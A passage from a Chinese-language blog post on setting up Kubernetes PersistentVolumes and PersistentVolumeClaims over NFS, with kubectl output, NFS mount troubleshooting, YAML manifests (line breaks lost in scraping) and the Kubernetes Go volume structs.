calico-kube-controllers-65b86747bd-c4qsp 1/1 Running 10 41d kube-system calico-node-lglh4 1/1 Running 11 41d kube-system coredns-8677555d68-flqh4 1/1 Running 1 90m kube-system kube-apiserver-node131 1/1 Running 10 41d kube-system kube-controller-manager-node131 1/1 Running 10 41d kube-system kube-proxy-mktp9 1/1 Running 10 41d kube-system kube-scheduler-node131 1/1 Running 10 41d kube-system nodelocaldns-lfjzs 1/1 Running 10 41d [root@node131 nfs]# [root@node131 nfs]# cat /tmp/data/index.html Mon Feb 1 09:59:49 UTC 2021 nfs-busybox-9td8j [root@node131 nfs]# cat /tmp/data/index.html Mon Feb 1 09:59:49 UTC 2021 nfs-busybox-9td8j [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# cat /tmp/data/index.html Mon Feb 1 09:59:57 UTC 2021 nfs-busybox-9td8j [root@node131 nfs]# [root@node131 nfs]# kubectl exec -ndefault nfs-busybox-r76ml -- cat /mnt/index.html Mon Feb 1 10:17:58 UTC 2021 nfs-busybox-mntdb [root@node131 nfs]#   每10s左右会更新web页面。这个busybox执行的是存储写操作。。。 多个busybox的运行pod表示多实例写操作\n 启动web server（nginx）  1 2 3 4 5 6  #kubectl create -f examples/staging/volumes/nfs/nfs-web-rc.yaml #kubectl create -f examples/staging/volumes/nfs/nfs-web-service.yaml kubectl create -f nfs/nfs-web-rc.yaml kubectl create -f nfs/nfs-web-service.yaml   web服务已运行，查看web服务的html页面\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  [root@node131 nfs]# kubectl get po -A NAMESPACE NAME READY STATUS RESTARTS AGE default nfs-busybox-mntdb 1/1 Running 0 35s default nfs-busybox-r76ml 1/1 Running 0 35s default nfs-server-p6p4n 1/1 Running 1 134m default nfs-web-dhmst 1/1 Running 0 8m19s default nfs-web-lxlcr 1/1 Running 0 8m19s kube-system calico-kube-controllers-65b86747bd-c4qsp 1/1 Running 10 41d kube-system calico-node-lglh4 1/1 Running 11 41d kube-system coredns-8677555d68-flqh4 1/1 Running 1 90m kube-system kube-apiserver-node131 1/1 Running 10 41d kube-system kube-controller-manager-node131 1/1 Running 10 41d kube-system kube-proxy-mktp9 1/1 Running 10 41d kube-system kube-scheduler-node131 1/1 Running 10 41d kube-system nodelocaldns-lfjzs 1/1 Running 10 41d [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes ClusterIP 10.233.0.1 \u0026lt;none\u0026gt; 443/TCP 41d nfs-server ClusterIP 10.233.63.192 \u0026lt;none\u0026gt; 2049/TCP,20048/TCP,111/TCP 140m nfs-web ClusterIP 10.233.63.218 \u0026lt;none\u0026gt; 80/TCP 15m [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl exec nfs-web-dhmst -- cat /usr/share/nginx/html/index.html Mon Feb 1 10:06:54 UTC 2021 nfs-busybox-9td8j [root@node131 nfs]#   在busybox的pod中，http访问web服务，查看页面\n直接访问web服务域名\n1  kubectl exec -ndefault nfs-busybox-mntdb -- wget -qO- http://nfs-web   1 2 3 4 5 6 7 8 9 10 11 12 13  [root@node131 nfs]# [root@node131 nfs]# kubectl exec -ndefault nfs-busybox-mntdb -- wget -qO- http://nfs-web Mon Feb 1 10:24:37 UTC 2021 nfs-busybox-mntdb [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl exec -ndefault nfs-busybox-mntdb -- wget -qO- http://nfs-web Mon Feb 1 10:24:41 UTC 2021 nfs-busybox-r76ml [root@node131 nfs]#   测试的pv和pvc信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  [root@node131 ~]# kubectl describe pv Name: nfs Labels: \u0026lt;none\u0026gt; Annotations: pv.kubernetes.io/bound-by-controller: yes Finalizers: [kubernetes.io/pv-protection] StorageClass: Status: Bound Claim: default/nfs Reclaim Policy: Retain Access Modes: RWX VolumeMode: Filesystem Capacity: 1Mi Node Affinity: \u0026lt;none\u0026gt; Message: Source: Type: NFS (an NFS mount that lasts the lifetime of a pod) Server: 10.233.16.102 Path: /exports ReadOnly: false Events: \u0026lt;none\u0026gt; [root@node131 ~]# [root@node131 ~]# [root@node131 ~]# kubectl describe pvc Name: nfs Namespace: default StorageClass: Status: Bound Volume: nfs Labels: \u0026lt;none\u0026gt; Annotations: pv.kubernetes.io/bind-completed: yes pv.kubernetes.io/bound-by-controller: yes Finalizers: [kubernetes.io/pvc-protection] Capacity: 1Mi Access Modes: RWX VolumeMode: Filesystem Used By: nfs-busybox-b8wdw nfs-busybox-hvc8w nfs-web-7bnhj nfs-web-mxpx9 Events: \u0026lt;none\u0026gt;   部署 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # create nfs server kubectl create -f nfs/custom-nfs-server-rc.yaml kubectl create -f nfs/nfs-server-service.yaml # create nfs pv pvc kubectl create -f nfs/custom-nfs-pv.yaml kubectl create -f nfs/custom-nfs-pvc.yaml # create busybox write kubectl create -f nfs/custom-nfs-busybox-rc.yaml # create web read kubectl create -f nfs/nfs-web-rc.yaml kubectl create -f nfs/nfs-web-service.yaml   卸载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  # remove web read kubectl delete -f nfs/nfs-web-service.yaml kubectl delete -f nfs/nfs-web-rc.yaml # remove busybox write kubectl delete -f nfs/custom-nfs-busybox-rc.yaml # remove nfs pv pvc kubectl delete -f nfs/nfs-pvc.yaml kubectl delete -f nfs/custom-nfs-pv.yaml # remove nfs server kubectl delete -f nfs/nfs-server-service.yaml kubectl delete -f nfs/custom-nfs-server-rc.yaml   问题 启动测试pod，进行mount时失败\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 26s default-scheduler Successfully assigned default/nfs-busybox-jwshl to node131 Warning FailedMount 11s (x6 over 27s) kubelet MountVolume.SetUp failed for volume \u0026#34;nfs\u0026#34; : mount failed: exit status 32 Mounting command: mount Mounting arguments: -t nfs nfs-server.default.svc.cluster.local:/tmp/data /var/lib/kubelet/pods/d4ca8ca9-e1c8-4610-8a74-f0fdea827fee/volumes/kubernetes.io~nfs/nfs Output: mount: 文件系统类型错误、选项错误、nfs-server.default.svc.cluster.local:/tmp/data 上有坏超级块、 缺少代码页或助手程序，或其他错误 (对某些文件系统(如 nfs、cifs) 您可能需要 一款 /sbin/mount.\u0026lt;类型\u0026gt; 助手程序) 有些情况下在 syslog 中可以找到一些有用信息- 请尝试 dmesg | tail 这样的命令看看。   首先检查 内核是否支持nfs文件系统格式，方法如下\ncat /proc/filesystems 如果能够看到 nfs 或者nfs4字样就说明内核支持nfs格式的文件系统，否则需要重新编译新的支持nfs文件系统的内核。\n如果检查内核支持nfs格式的文件系统后，检查mount.nfs是否安装：\nls /sbin/mount.* 看是否有 mount.nfs 或者 mount.nfs4 如果没有需要安装 nfs_utils\n1  ls /sbin/mount.*   yum install nfs-utils (redhat系列)\n1  yum install -y nfs-utils   apt-get install common(ubuntu系列)\n1  apt-get install nfs-common   挂载域名无法解析，使用ip地址标识\nOutput: mount.nfs: Protocol not supported 1 2 3 4 5 6 7 8 9 10 11  Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 28s default-scheduler Successfully assigned default/nfs-busybox-k6dpc to node131 Warning FailedMount 11s (x6 over 27s) kubelet MountVolume.SetUp failed for volume \u0026#34;nfs\u0026#34; : mount failed: exit status 32 Mounting command: mount Mounting arguments: -t nfs 10.233.124.49:/tmp/data /var/lib/kubelet/pods/e5932fde-fe05-4612-b29d-333f48b03338/volumes/kubernetes.io~nfs/nfs Output: mount.nfs: Protocol not supported [root@node131 nfs]#   https://stackoverflow.com/questions/35650935/output-mount-nfs-requested-nfs-version-or-transport-protocol-is-not-supported\n访问挂载路径，服务端access denied 1 2 3 4 5 6 7 8 9 10  Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 33s default-scheduler Successfully assigned default/nfs-busybox-4ht5m to node131 Warning FailedMount 1s (x7 over 34s) kubelet MountVolume.SetUp failed for volume \u0026#34;nfs\u0026#34; : mount failed: exit status 32 Mounting command: mount Mounting arguments: -t nfs 10.233.124.49:/ /var/lib/kubelet/pods/bd34361c-4883-47a2-9e70-08772437e341/volumes/kubernetes.io~nfs/nfs Output: mount.nfs: access denied by server while mounting 10.233.124.49:/ [root@node131 nfs]#   原因挂载路径错误\npv配置的挂载路径path需跟nfs服务定义的路径一致。\n1 2 3 4 5 6  nfs:#server: nfs-server.default.svc.cluster.localserver:10.233.124.49path:\u0026#34;/exports\u0026#34;  附录 按服务和资源配置顺序，依次如下\ncustom-nfs-server-rc.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  apiVersion:v1kind:ReplicationControllermetadata:name:nfs-serverspec:replicas:1selector:role:nfs-servertemplate:metadata:labels:role:nfs-serverspec:containers:- name:nfs-serverimage:k8s.gcr.io/volume-nfs:0.8ports:- name:nfscontainerPort:2049- name:mountdcontainerPort:20048- name:rpcbindcontainerPort:111securityContext:privileged:truevolumeMounts:- mountPath:/exports# name: mypvcname:data-volumevolumes:# - name: mypvc# persistentVolumeClaim:# claimName: nfs-pv-provisioning-demo- name:data-volume #卷名hostPath:path:/tmp/data  custom-nfs-pv.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  apiVersion:v1kind:PersistentVolumemetadata:name:nfsspec:capacity:storage:1MiaccessModes:- ReadWriteMany#- ReadWriteOncenfs:# faild: nfs-server svc name#server: nfs-server.default.svc.cluster.local# success: nfs-server svc ipserver:10.233.16.102path:\u0026#34;/exports\u0026#34;  custom-nfs-pvc.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13  apiVersion:v1kind:PersistentVolumeClaimmetadata:name:nfsspec:accessModes:- ReadWriteMany#- ReadWriteOncestorageClassName:\u0026#34;\u0026#34;resources:requests:storage:1Mi  custom-nfs-busybox-rc.yaml 使用pvc进行nfs存储写操作\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  # This mounts the nfs volume claim into /mnt and continuously# overwrites /mnt/index.html with the time and hostname of the pod.apiVersion:v1kind:ReplicationControllermetadata:name:nfs-busyboxspec:replicas:2selector:name:nfs-busyboxtemplate:metadata:labels:name:nfs-busyboxspec:containers:- image:busyboxcommand:- sh- -c- \u0026#39;while true; do date \u0026gt; /mnt/index.html; hostname \u0026gt;\u0026gt; /mnt/index.html; sleep $(($RANDOM % 5 + 5)); done\u0026#39;imagePullPolicy:IfNotPresentname:busyboxvolumeMounts:# name must match the volume name below- name:nfsmountPath:\u0026#34;/mnt\u0026#34;volumes:- name:nfspersistentVolumeClaim:claimName:nfs  nfs-web-rc.yaml 使用pvc进行nfs存储读操作\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  # This pod mounts the nfs volume claim into /usr/share/nginx/html and# serves a simple web page.apiVersion:v1kind:ReplicationControllermetadata:name:nfs-webspec:replicas:2selector:role:web-frontendtemplate:metadata:labels:role:web-frontendspec:containers:- name:webimage:nginx:1.19ports:- name:webcontainerPort:80volumeMounts:# name must match the volume name below- name:nfsmountPath:\u0026#34;/usr/share/nginx/html\u0026#34;volumes:- name:nfspersistentVolumeClaim:claimName:nfs  pv和pvc结构体\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253  // Volume represents a named volume in a pod that may be accessed by any container in the pod. type Volume struct { // Volume\u0026#39;s name.  // Must be a DNS_LABEL and unique within the pod.  // More info: https://kubernetes.io/docs/concepts/overview/working-with-objects/names/#names  Name string `json:\u0026#34;name\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=name\u0026#34;` // VolumeSource represents the location and type of the mounted volume.  // If not specified, the Volume is implied to be an EmptyDir.  // This implied behavior is deprecated and will be removed in a future version.  VolumeSource `json:\u0026#34;,inline\u0026#34; protobuf:\u0026#34;bytes,2,opt,name=volumeSource\u0026#34;` } // Represents the source of a volume to mount. // Only one of its members may be specified. type VolumeSource struct { // HostPath represents a pre-existing file or directory on the host  // machine that is directly exposed to the container. This is generally  // used for system agents or other privileged things that are allowed  // to see the host machine. Most containers will NOT need this.  // More info: https://kubernetes.io/docs/concepts/storage/volumes#hostpath  // ---  // TODO(jonesdl) We need to restrict who can use host directory mounts and who can/can not  // mount host directories as read/write.  // +optional  HostPath *HostPathVolumeSource `json:\u0026#34;hostPath,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=hostPath\u0026#34;` // EmptyDir represents a temporary directory that shares a pod\u0026#39;s lifetime.  // More info: https://kubernetes.io/docs/concepts/storage/volumes#emptydir  // +optional  EmptyDir *EmptyDirVolumeSource `json:\u0026#34;emptyDir,omitempty\u0026#34; protobuf:\u0026#34;bytes,2,opt,name=emptyDir\u0026#34;` // GCEPersistentDisk represents a GCE Disk resource that is attached to a  // kubelet\u0026#39;s host machine and then exposed to the pod.  // More info: https://kubernetes.io/docs/concepts/storage/volumes#gcepersistentdisk  // +optional  GCEPersistentDisk *GCEPersistentDiskVolumeSource `json:\u0026#34;gcePersistentDisk,omitempty\u0026#34; protobuf:\u0026#34;bytes,3,opt,name=gcePersistentDisk\u0026#34;` // AWSElasticBlockStore represents an AWS Disk resource that is attached to a  // kubelet\u0026#39;s host machine and then exposed to the pod.  // More info: https://kubernetes.io/docs/concepts/storage/volumes#awselasticblockstore  // +optional  AWSElasticBlockStore *AWSElasticBlockStoreVolumeSource `json:\u0026#34;awsElasticBlockStore,omitempty\u0026#34; protobuf:\u0026#34;bytes,4,opt,name=awsElasticBlockStore\u0026#34;` // GitRepo represents a git repository at a particular revision.  // DEPRECATED: GitRepo is deprecated. To provision a container with a git repo, mount an  // EmptyDir into an InitContainer that clones the repo using git, then mount the EmptyDir  // into the Pod\u0026#39;s container.  // +optional  GitRepo *GitRepoVolumeSource `json:\u0026#34;gitRepo,omitempty\u0026#34; protobuf:\u0026#34;bytes,5,opt,name=gitRepo\u0026#34;` // Secret represents a secret that should populate this volume.  // More info: https://kubernetes.io/docs/concepts/storage/volumes#secret  // +optional  Secret *SecretVolumeSource `json:\u0026#34;secret,omitempty\u0026#34; protobuf:\u0026#34;bytes,6,opt,name=secret\u0026#34;` // NFS represents an NFS mount on the host that shares a pod\u0026#39;s lifetime  // More info: https://kubernetes.io/docs/concepts/storage/volumes#nfs  // +optional  NFS *NFSVolumeSource `json:\u0026#34;nfs,omitempty\u0026#34; protobuf:\u0026#34;bytes,7,opt,name=nfs\u0026#34;` // ISCSI represents an ISCSI Disk resource that is attached to a  // kubelet\u0026#39;s host machine and then exposed to the pod.  // More info: https://examples.k8s.io/volumes/iscsi/README.md  // +optional  ISCSI *ISCSIVolumeSource `json:\u0026#34;iscsi,omitempty\u0026#34; protobuf:\u0026#34;bytes,8,opt,name=iscsi\u0026#34;` // Glusterfs represents a Glusterfs mount on the host that shares a pod\u0026#39;s lifetime.  // More info: https://examples.k8s.io/volumes/glusterfs/README.md  // +optional  Glusterfs *GlusterfsVolumeSource `json:\u0026#34;glusterfs,omitempty\u0026#34; protobuf:\u0026#34;bytes,9,opt,name=glusterfs\u0026#34;` // PersistentVolumeClaimVolumeSource represents a reference to a  // PersistentVolumeClaim in the same namespace.  // More info: https://kubernetes.io/docs/concepts/storage/persistent-volumes#persistentvolumeclaims  // +optional  PersistentVolumeClaim *PersistentVolumeClaimVolumeSource `json:\u0026#34;persistentVolumeClaim,omitempty\u0026#34; protobuf:\u0026#34;bytes,10,opt,name=persistentVolumeClaim\u0026#34;` // RBD represents a Rados Block Device mount on the host that shares a pod\u0026#39;s lifetime.  // More info: https://examples.k8s.io/volumes/rbd/README.md  // +optional  RBD *RBDVolumeSource `json:\u0026#34;rbd,omitempty\u0026#34; protobuf:\u0026#34;bytes,11,opt,name=rbd\u0026#34;` // FlexVolume represents a generic volume resource that is  // provisioned/attached using an exec based plugin.  // +optional  FlexVolume *FlexVolumeSource `json:\u0026#34;flexVolume,omitempty\u0026#34; protobuf:\u0026#34;bytes,12,opt,name=flexVolume\u0026#34;` // Cinder represents a cinder volume attached and mounted on kubelets host machine.  // More info: https://examples.k8s.io/mysql-cinder-pd/README.md  // +optional  Cinder *CinderVolumeSource `json:\u0026#34;cinder,omitempty\u0026#34; protobuf:\u0026#34;bytes,13,opt,name=cinder\u0026#34;` // CephFS represents a Ceph FS mount on the host that shares a pod\u0026#39;s lifetime  // +optional  CephFS *CephFSVolumeSource `json:\u0026#34;cephfs,omitempty\u0026#34; protobuf:\u0026#34;bytes,14,opt,name=cephfs\u0026#34;` // Flocker represents a Flocker volume attached to a kubelet\u0026#39;s host machine. This depends on the Flocker control service being running  // +optional  Flocker *FlockerVolumeSource `json:\u0026#34;flocker,omitempty\u0026#34; protobuf:\u0026#34;bytes,15,opt,name=flocker\u0026#34;` // DownwardAPI represents downward API about the pod that should populate this volume  // +optional  DownwardAPI *DownwardAPIVolumeSource `json:\u0026#34;downwardAPI,omitempty\u0026#34; protobuf:\u0026#34;bytes,16,opt,name=downwardAPI\u0026#34;` // FC represents a Fibre Channel resource that is attached to a kubelet\u0026#39;s host machine and then exposed to the pod.  // +optional  FC *FCVolumeSource `json:\u0026#34;fc,omitempty\u0026#34; protobuf:\u0026#34;bytes,17,opt,name=fc\u0026#34;` // AzureFile represents an Azure File Service mount on the host and bind mount to the pod.  // +optional  AzureFile *AzureFileVolumeSource `json:\u0026#34;azureFile,omitempty\u0026#34; protobuf:\u0026#34;bytes,18,opt,name=azureFile\u0026#34;` // ConfigMap represents a configMap that should populate this volume  // +optional  ConfigMap *ConfigMapVolumeSource `json:\u0026#34;configMap,omitempty\u0026#34; protobuf:\u0026#34;bytes,19,opt,name=configMap\u0026#34;` // VsphereVolume represents a vSphere volume attached and mounted on kubelets host machine  // +optional  VsphereVolume *VsphereVirtualDiskVolumeSource `json:\u0026#34;vsphereVolume,omitempty\u0026#34; protobuf:\u0026#34;bytes,20,opt,name=vsphereVolume\u0026#34;` // Quobyte represents a Quobyte mount on the host that shares a pod\u0026#39;s lifetime  // +optional  Quobyte *QuobyteVolumeSource `json:\u0026#34;quobyte,omitempty\u0026#34; protobuf:\u0026#34;bytes,21,opt,name=quobyte\u0026#34;` // AzureDisk represents an Azure Data Disk mount on the host and bind mount to the pod.  // +optional  AzureDisk *AzureDiskVolumeSource `json:\u0026#34;azureDisk,omitempty\u0026#34; protobuf:\u0026#34;bytes,22,opt,name=azureDisk\u0026#34;` // PhotonPersistentDisk represents a PhotonController persistent disk attached and mounted on kubelets host machine  PhotonPersistentDisk *PhotonPersistentDiskVolumeSource `json:\u0026#34;photonPersistentDisk,omitempty\u0026#34; protobuf:\u0026#34;bytes,23,opt,name=photonPersistentDisk\u0026#34;` // Items for all in one resources secrets, configmaps, and downward API  Projected *ProjectedVolumeSource `json:\u0026#34;projected,omitempty\u0026#34; protobuf:\u0026#34;bytes,26,opt,name=projected\u0026#34;` // PortworxVolume represents a portworx volume attached and mounted on kubelets host machine  // +optional  PortworxVolume *PortworxVolumeSource `json:\u0026#34;portworxVolume,omitempty\u0026#34; protobuf:\u0026#34;bytes,24,opt,name=portworxVolume\u0026#34;` // ScaleIO represents a ScaleIO persistent volume attached and mounted on Kubernetes nodes.  // +optional  ScaleIO *ScaleIOVolumeSource `json:\u0026#34;scaleIO,omitempty\u0026#34; protobuf:\u0026#34;bytes,25,opt,name=scaleIO\u0026#34;` // StorageOS represents a StorageOS volume attached and mounted on Kubernetes nodes.  // +optional  StorageOS *StorageOSVolumeSource `json:\u0026#34;storageos,omitempty\u0026#34; protobuf:\u0026#34;bytes,27,opt,name=storageos\u0026#34;` // CSI (Container Storage Interface) represents ephemeral storage that is handled by certain external CSI drivers (Beta feature).  // +optional  CSI *CSIVolumeSource `json:\u0026#34;csi,omitempty\u0026#34; protobuf:\u0026#34;bytes,28,opt,name=csi\u0026#34;` // Ephemeral represents a volume that is handled by a cluster storage driver (Alpha feature).  // The volume\u0026#39;s lifecycle is tied to the pod that defines it - it will be created before the pod starts,  // and deleted when the pod is removed.  //  // Use this if:  // a) the volume is only needed while the pod runs,  // b) features of normal volumes like restoring from snapshot or capacity  // tracking are needed,  // c) the storage driver is specified through a storage class, and  // d) the storage driver supports dynamic volume provisioning through  // a PersistentVolumeClaim (see EphemeralVolumeSource for more  // information on the connection between this volume type  // and PersistentVolumeClaim).  //  // Use PersistentVolumeClaim or one of the vendor-specific  // APIs for volumes that persist for longer than the lifecycle  // of an individual pod.  //  // Use CSI for light-weight local ephemeral volumes if the CSI driver is meant to  // be used that way - see the documentation of the driver for  // more information.  //  // A pod can use both types of ephemeral volumes and  // persistent volumes at the same time.  //  // +optional  Ephemeral *EphemeralVolumeSource `json:\u0026#34;ephemeral,omitempty\u0026#34; protobuf:\u0026#34;bytes,29,opt,name=ephemeral\u0026#34;` } // PersistentVolumeClaimVolumeSource references the user\u0026#39;s PVC in the same namespace. // This volume finds the bound PV and mounts that volume for the pod. A // PersistentVolumeClaimVolumeSource is, essentially, a wrapper around another // type of volume that is owned by someone else (the system). type PersistentVolumeClaimVolumeSource struct { // ClaimName is the name of a PersistentVolumeClaim in the same namespace as the pod using this volume.  // More info: https://kubernetes.io/docs/concepts/storage/persistent-volumes#persistentvolumeclaims  ClaimName string `json:\u0026#34;claimName\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=claimName\u0026#34;` // Will force the ReadOnly setting in VolumeMounts.  // Default false.  // +optional  ReadOnly bool `json:\u0026#34;readOnly,omitempty\u0026#34; protobuf:\u0026#34;varint,2,opt,name=readOnly\u0026#34;` } // PersistentVolumeSource is similar to VolumeSource but meant for the // administrator who creates PVs. Exactly one of its members must be set. type PersistentVolumeSource struct { // GCEPersistentDisk represents a GCE Disk resource that is attached to a  // kubelet\u0026#39;s host machine and then exposed to the pod. Provisioned by an admin.  // More info: https://kubernetes.io/docs/concepts/storage/volumes#gcepersistentdisk  // +optional  GCEPersistentDisk *GCEPersistentDiskVolumeSource `json:\u0026#34;gcePersistentDisk,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=gcePersistentDisk\u0026#34;` // AWSElasticBlockStore represents an AWS Disk resource that is attached to a  // kubelet\u0026#39;s host machine and then exposed to the pod.  // More info: https://kubernetes.io/docs/concepts/storage/volumes#awselasticblockstore  // +optional  AWSElasticBlockStore *AWSElasticBlockStoreVolumeSource `json:\u0026#34;awsElasticBlockStore,omitempty\u0026#34; protobuf:\u0026#34;bytes,2,opt,name=awsElasticBlockStore\u0026#34;` // HostPath represents a directory on the host.  // Provisioned by a developer or tester.  // This is useful for single-node development and testing only!  // On-host storage is not supported in any way and WILL NOT WORK in a multi-node cluster.  // More info: https://kubernetes.io/docs/concepts/storage/volumes#hostpath  // +optional  HostPath *HostPathVolumeSource `json:\u0026#34;hostPath,omitempty\u0026#34; protobuf:\u0026#34;bytes,3,opt,name=hostPath\u0026#34;` // Glusterfs represents a Glusterfs volume that is attached to a host and  // exposed to the pod. Provisioned by an admin.  // More info: https://examples.k8s.io/volumes/glusterfs/README.md  // +optional  Glusterfs *GlusterfsPersistentVolumeSource `json:\u0026#34;glusterfs,omitempty\u0026#34; protobuf:\u0026#34;bytes,4,opt,name=glusterfs\u0026#34;` // NFS represents an NFS mount on the host. Provisioned by an admin.  // More info: https://kubernetes.io/docs/concepts/storage/volumes#nfs  // +optional  NFS *NFSVolumeSource `json:\u0026#34;nfs,omitempty\u0026#34; protobuf:\u0026#34;bytes,5,opt,name=nfs\u0026#34;` // RBD represents a Rados Block Device mount on the host that shares a pod\u0026#39;s lifetime.  // More info: https://examples.k8s.io/volumes/rbd/README.md  // +optional  RBD *RBDPersistentVolumeSource `json:\u0026#34;rbd,omitempty\u0026#34; protobuf:\u0026#34;bytes,6,opt,name=rbd\u0026#34;` // ISCSI represents an ISCSI Disk resource that is attached to a  // kubelet\u0026#39;s host machine and then exposed to the pod. Provisioned by an admin.  // +optional  ISCSI *ISCSIPersistentVolumeSource `json:\u0026#34;iscsi,omitempty\u0026#34; protobuf:\u0026#34;bytes,7,opt,name=iscsi\u0026#34;` // Cinder represents a cinder volume attached and mounted on kubelets host machine.  // More info: https://examples.k8s.io/mysql-cinder-pd/README.md  // +optional  Cinder *CinderPersistentVolumeSource `json:\u0026#34;cinder,omitempty\u0026#34; protobuf:\u0026#34;bytes,8,opt,name=cinder\u0026#34;` // CephFS represents a Ceph FS mount on the host that shares a pod\u0026#39;s lifetime  // +optional  CephFS *CephFSPersistentVolumeSource `json:\u0026#34;cephfs,omitempty\u0026#34; protobuf:\u0026#34;bytes,9,opt,name=cephfs\u0026#34;` // FC represents a Fibre Channel resource that is attached to a kubelet\u0026#39;s host machine and then exposed to the pod.  // +optional  FC *FCVolumeSource `json:\u0026#34;fc,omitempty\u0026#34; protobuf:\u0026#34;bytes,10,opt,name=fc\u0026#34;` // Flocker represents a Flocker volume attached to a kubelet\u0026#39;s host machine and exposed to the pod for its usage. This depends on the Flocker control service being running  // +optional  Flocker *FlockerVolumeSource `json:\u0026#34;flocker,omitempty\u0026#34; protobuf:\u0026#34;bytes,11,opt,name=flocker\u0026#34;` // FlexVolume represents a generic volume resource that is  // provisioned/attached using an exec based plugin.  // +optional  FlexVolume *FlexPersistentVolumeSource `json:\u0026#34;flexVolume,omitempty\u0026#34; protobuf:\u0026#34;bytes,12,opt,name=flexVolume\u0026#34;` // AzureFile represents an Azure File Service mount on the host and bind mount to the pod.  // +optional  AzureFile *AzureFilePersistentVolumeSource `json:\u0026#34;azureFile,omitempty\u0026#34; protobuf:\u0026#34;bytes,13,opt,name=azureFile\u0026#34;` // VsphereVolume represents a vSphere volume attached and mounted on kubelets host machine  // +optional  VsphereVolume *VsphereVirtualDiskVolumeSource `json:\u0026#34;vsphereVolume,omitempty\u0026#34; protobuf:\u0026#34;bytes,14,opt,name=vsphereVolume\u0026#34;` // Quobyte represents a Quobyte mount on the host that shares a pod\u0026#39;s lifetime  // +optional  Quobyte *QuobyteVolumeSource `json:\u0026#34;quobyte,omitempty\u0026#34; protobuf:\u0026#34;bytes,15,opt,name=quobyte\u0026#34;` // AzureDisk represents an Azure Data Disk mount on the host and bind mount to the pod.  // +optional  AzureDisk *AzureDiskVolumeSource `json:\u0026#34;azureDisk,omitempty\u0026#34; protobuf:\u0026#34;bytes,16,opt,name=azureDisk\u0026#34;` // PhotonPersistentDisk represents a PhotonController persistent disk attached and mounted on kubelets host machine  PhotonPersistentDisk *PhotonPersistentDiskVolumeSource `json:\u0026#34;photonPersistentDisk,omitempty\u0026#34; protobuf:\u0026#34;bytes,17,opt,name=photonPersistentDisk\u0026#34;` // PortworxVolume represents a portworx volume attached and mounted on kubelets host machine  // +optional  PortworxVolume *PortworxVolumeSource `json:\u0026#34;portworxVolume,omitempty\u0026#34; protobuf:\u0026#34;bytes,18,opt,name=portworxVolume\u0026#34;` // ScaleIO represents a ScaleIO persistent volume attached and mounted on Kubernetes nodes.  // +optional  ScaleIO *ScaleIOPersistentVolumeSource `json:\u0026#34;scaleIO,omitempty\u0026#34; protobuf:\u0026#34;bytes,19,opt,name=scaleIO\u0026#34;` // Local represents directly-attached storage with node affinity  // +optional  Local *LocalVolumeSource `json:\u0026#34;local,omitempty\u0026#34; protobuf:\u0026#34;bytes,20,opt,name=local\u0026#34;` // StorageOS represents a StorageOS volume that is attached to the kubelet\u0026#39;s host machine and mounted into the pod  // More info: https://examples.k8s.io/volumes/storageos/README.md  // +optional  StorageOS *StorageOSPersistentVolumeSource `json:\u0026#34;storageos,omitempty\u0026#34; protobuf:\u0026#34;bytes,21,opt,name=storageos\u0026#34;` // CSI represents storage that is handled by an external CSI driver (Beta feature).  // +optional  CSI *CSIPersistentVolumeSource `json:\u0026#34;csi,omitempty\u0026#34; protobuf:\u0026#34;bytes,22,opt,name=csi\u0026#34;` }   参考资料   volume概念\n  persistent-volumes概念\n  持久存储设计文档\n  存储类StorageClass\n  基于运行示例的详细演练\n  存储卷和数据持久化(Volumes and Persistent Storage)\n ","permalink":"http://bingerambo.com/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/","tags":["K8S"],"title":"K8S的PV和PVC介绍"},{"categories":["K8S"],"contents":"记录hugepage配置导致k8s的kubelet重启失败问题的排查过程\n问题 kubelet 